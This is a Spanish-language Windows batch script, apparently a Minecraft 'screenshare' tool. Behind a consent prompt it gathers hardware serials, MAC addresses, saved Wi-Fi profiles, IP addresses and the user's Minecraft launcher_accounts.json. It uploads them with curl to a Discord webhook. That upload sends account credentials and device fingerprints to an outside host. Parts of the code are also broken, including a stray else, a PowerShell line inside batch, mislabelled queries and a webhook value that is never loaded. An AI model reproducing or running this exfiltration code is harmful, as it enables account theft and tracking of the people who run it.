::::::::::::::::::::::::::::::::::::::::::::::::: Profile ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:Profile
@echo off
chcp 65001
cls
net session >%temp%/HWID_Finder.tmp
if %errorlevel%==0 goto Menu 
else (
cls
    color 0c
    echo.
	echo.
	echo.
	echo.
            echo                        ██                                          
            echo                      ██░░██                                        
            echo                    ██░░░░░░██             
            echo                  ██░░░░░░░░░░██                                    
            echo                  ██░░░░░░░░░░██                                    
            echo                ██░░░░░░░░░░░░░░██                                  
            echo              ██░░░░░░██████░░░░░░██                                
            echo              ██░░░░░░██████░░░░░░██                                
            echo            ██░░░░░░░░██████░░░░░░░░██                              
            echo            ██░░░░░░░░██████░░░░░░░░██           Se ha producido un error al abir este programa. Error:		
            echo          ██░░░░░░░░░░██████░░░░░░░░░░██         Este programa necesita ejecutarse como administrador!                   
            echo        ██░░░░░░░░░░░░██████░░░░░░░░░░░░██                          
            echo        ██░░░░░░░░░░░░██████░░░░░░░░░░░░██                          
            echo      ██░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░██                        
            echo      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                        
            echo    ██░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░██                      
            echo    ██░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░██                      
            echo  ██░░░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░░░██                    
            echo  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                    
            echo    ██████████████████████████████████████████   
    echo.
    timeout 4 >%temp%/HWID_Finder.tmp
    exit
)

::::::::::::::::::::::::::::::::::::::::::::::::: Menu :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


:menu
cls

Title HWID Finder
color b
chcp 65001
cls
echo.
echo                      ██╗  ██╗██╗    ██╗██╗██████╗     ███████╗██╗███╗   ██╗██████╗ ███████╗██████╗ 
echo                      ██║  ██║██║    ██║██║██╔══██╗    ██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
echo                      ███████║██║ █╗ ██║██║██║  ██║    █████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
echo                      ██╔══██║██║███╗██║██║██║  ██║    ██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
echo                      ██║  ██║╚███╔███╔╝██║██████╔╝    ██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║
echo                      ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
echo.
echo.              
echo                                               [ 1 ] - Buscar HWID
echo                                               [ 2 ] - Abrir config / crear config
echo                                               [ 3 ] - Salir
echo.
echo.
echo.
set/p menu=Seleccionar: 
if %menu%== 1 (goto tos)
if %menu%== 2 (goto config)
if %menu%== 3 (exit)
goto menu
::::::::::::::::::::::::::::::::::::::::::::::::: Crear config ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
:config
cls
echo Detectando si existe...
timeout 1 >%temp%/HWID_Finder.tmp
IF NOT EXIST .\config.adevs (
cls
echo Archivo de configuracion no detectado. Creando uno...
timeout 1 >%temp%/HWID_Finder.tmp
echo ;;Configuracion de HWID Extractor. Solo cambia despues de "=". Ejemplo: NOTOCAR=CAMIAR_AQUI > .\config.adevs
echo ;;Webhook link: >> .\config.adevs
echo WEBHOOK_URL=TuLinkAqui >> .\config.adevs
)
cls
echo Archivo de configuracion encontrado. Abriendolo...
timeout 1 >%temp%/HWID_Finder.tmp
start .\config.adevs
goto menu
::::::::::::::::::::::::::::::::::::::::::::::::: TOS::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
:tos
color b
cls
echo                                              TOS
echo Este programa esta apunto de extraer tu Hwid y otras cosas.
echo Cosas que este programa buscara las siguientes cosas de ti:	
echo.
echo Usurario en el que estas logeado, nombre del PC,
echo nombre del domino de tu PC, UUID's, tu MAC, ID de tu processador,
echo MAC's y nombres de tus adaptadores de red, el nombre de tus redes wifi
echo tus cuentas de Minecraft vinculadas en este PC y tu IP
echo Despues un archivo temporal sera creado con esa informacion y sera envidada a un Webhook de Discord 
echo definido por el que hace la SS (En config.adevs)
echo.
echo Esta herramienta fue creada por craciu25_YT / AuchenDevs para prevenir bypasses de SS, no para fines ilicitos o propositos dañinos.
echo. 
echo Aceptas los Terminos?
echo Responde con un Si/No
echo.
set/p tos=     
if %tos%==si goto hwid
if %tos%==Si goto hwid 
if %tos%==SI goto hwid 
if %tos%==no goto cancelado
if %tos%==No goto cancelado
if %tos%==NO goto cancelado
cls
    color 0c
    echo.
	echo.
	echo.
	echo.
            echo                        ██                                          
            echo                      ██░░██                                        
            echo                    ██░░░░░░██             
            echo                  ██░░░░░░░░░░██                                    
            echo                  ██░░░░░░░░░░██                                    
            echo                ██░░░░░░░░░░░░░░██                                  
            echo              ██░░░░░░██████░░░░░░██                                
            echo              ██░░░░░░██████░░░░░░██                                
            echo            ██░░░░░░░░██████░░░░░░░░██                              
            echo            ██░░░░░░░░██████░░░░░░░░██           Se ha producido un error al abir este programa. Error:		
            echo          ██░░░░░░░░░░██████░░░░░░░░░░██         Tienes que responder con un Si o un No!             
            echo        ██░░░░░░░░░░░░██████░░░░░░░░░░░░██                          
            echo        ██░░░░░░░░░░░░██████░░░░░░░░░░░░██                          
            echo      ██░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░██                        
            echo      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                        
            echo    ██░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░██                      
            echo    ██░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░██                      
            echo  ██░░░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░░░██                    
            echo  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                    
            echo    ██████████████████████████████████████████   
    echo.
    timeout 4 >%temp%/HWID_Finder.tmp
    goto tos
	::::::::::::::::::::::::::::::::::::::::::::::::: TOS No aceptado::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
	:cancelado
	cls
	    color 0c
    echo.
	echo.
	echo.
	echo.
            echo                        ██                                          
            echo                      ██░░██                                        
            echo                    ██░░░░░░██             
            echo                  ██░░░░░░░░░░██                                    
            echo                  ██░░░░░░░░░░██                                    
            echo                ██░░░░░░░░░░░░░░██                                  
            echo              ██░░░░░░██████░░░░░░██                                
            echo              ██░░░░░░██████░░░░░░██                                
            echo            ██░░░░░░░░██████░░░░░░░░██                              
            echo            ██░░░░░░░░██████░░░░░░░░██           La operacion fue cancelada. Razon:		
            echo          ██░░░░░░░░░░██████░░░░░░░░░░██         El usuario no acepto el ToS           
            echo        ██░░░░░░░░░░░░██████░░░░░░░░░░░░██                          
            echo        ██░░░░░░░░░░░░██████░░░░░░░░░░░░██                          
            echo      ██░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░██                        
            echo      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                        
            echo    ██░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░██                      
            echo    ██░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░██                      
            echo  ██░░░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░░░██                    
            echo  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                    
            echo    ██████████████████████████████████████████ 
			echo.
	timeout 4 >%temp%/HWID_Finder.tmp
	goto menu
::::::::::::::::::::::::::::::::::::::::::::::::: HWID ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
:hwid
if not exist "%temp%\HWID_Finder" (md "%temp%\HWID_Finder%")
cls
echo Main info: > %temp%\HWID_Finder\Output.txt

echo. >> %temp%\HWID_Finder\Output.txt
echo User Name       : %UserName% >> %temp%\HWID_Finder\Output.txt
echo Computer Name   : %ComputerName% >> %temp%\HWID_Finder\Output.txt
echo User Domain     : %UserDomain% >> %temp%\HWID_Finder\Output.txt


echo. >> %temp%\HWID_Finder\Output.txt
echo Windows uuids:>> %temp%\HWID_Finder\Output.txt
echo. >> %temp%\HWID_Finder\Output.txt
echo. >> %temp%\HWID_Finder\Output.txt
wmic path win32_computersystemproduct get uuid >> "%temp%\HWID_Finder\Output.txt"
wmic path win32_computersystemproduct get name >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo HDD UUID: >> "%temp%\HWID_Finder\Output.txt"
wmic diskdrive get serialnumber >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo CPU UUID: >> "%temp%\HWID_Finder\Output.txt"
wmic memorychip get serialnumber >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo MOTHERBOARD UUID: >> "%temp%\HWID_Finder\Output.txt"
wmic baseboard get serialnumber >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
getmac >> "%temp%\HWID_Finder\Output.txt"
Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property ProcessorId*" >> "%temp%\HWID_Finder\Output.txt"
echo. >> %temp%\HWID_Finder\Output.txt
echo. >> %temp%\HWID_Finder\Output.txt
echo. >> %temp%\HWID_Finder\Output.txt
echo Adaptadores RED: >> "%temp%\HWID_Finder\Output.txt"
wmic nic get Name, MACAddress >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo Wifis registrados: >> "%temp%\HWID_Finder\Output.txt"
netsh wlan show profile >> "%temp%\HWID_Finder\Output.txt"
ipconfig >> %temp%\HWID_Finder\Output.txt
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo IP: >> "%temp%\HWID_Finder\Output.txt"
curl ip-adresim.app >> "%temp%\HWID_Finder\Output.txt"
echo. >> "%temp%\HWID_Finder\Output.txt"
echo IPv4: >> "%temp%\HWID_Finder\Output.txt"
ipconfig /all | findstr /r /c:"IPv4" >> "%temp%\HWID_Finder\Output.txt"
cd "%temp%\HWID_Finder\"
curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@Output.txt" -F "payload_json={\"content\":\"%UserName% HWID\"}" %WEBHOOK_URL%
cd "%appdata%\.minecraft\"
curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@launcher_accounts.json" -F "payload_json={\"content\":\"%UserName% .Minecraft accounts\"}" %WEBHOOK_URL%
cls
echo Completado
pause
start "%temp%\HWID_Finder\Output.txt"
cls
goto :menu

